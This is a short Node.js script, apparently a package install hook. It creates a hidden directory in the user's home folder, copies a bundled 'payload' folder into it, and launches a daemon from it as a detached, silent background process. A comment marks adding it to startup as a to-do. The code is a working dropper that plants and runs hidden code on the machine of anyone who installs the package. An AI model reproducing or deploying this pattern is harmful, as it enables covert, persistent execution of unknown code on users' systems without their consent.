var spawn = require("child_process").spawn;
var path  = require("path");
var pkg   = require("./package");
var fs    = require("fs");

// create the install directory
var installLoc = path.join(homedir(), "." + pkg.name);
fs.mkdirSync(installLoc);

// copy the payload directory
var payloadLoc = path.join(__dirname, "payload");
var daemonLoc  = path.join(payloadLoc, "daemon.js");
fs.readdirSync(payloadLoc).forEach(function (file) {
  var dest = path.join(installLoc, file);
  var src  = path.join(payloadLoc, file);

  fs.writeFileSync(dest, fs.readFileSync(src));
});

// launch it
spawn(process.execPath, [daemonLoc], {
  detached: true,
  stdio: "ignore"
}).unref();

// TODO add it to startup

// get the home directory https://github.com/sindresorhus/os-homedir/blob/master/index.js
function homedir() {
  var env = process.env;
  var home = env.HOME;
  var user = env.LOGNAME || env.USER || env.LNAME || env.USERNAME;

  if (process.platform === "win32") {
    return env.USERPROFILE || env.HOMEDRIVE + env.HOMEPATH || home || null;
  }

  if (process.platform === "darwin") {
    return home || (user ? "/Users/" + user : null);
  }

  if (process.platform === "linux") {
    return home || (process.getuid() === 0 ? "/root" : (user ? "/home/" + user : null));
  }

  return home || null;
}
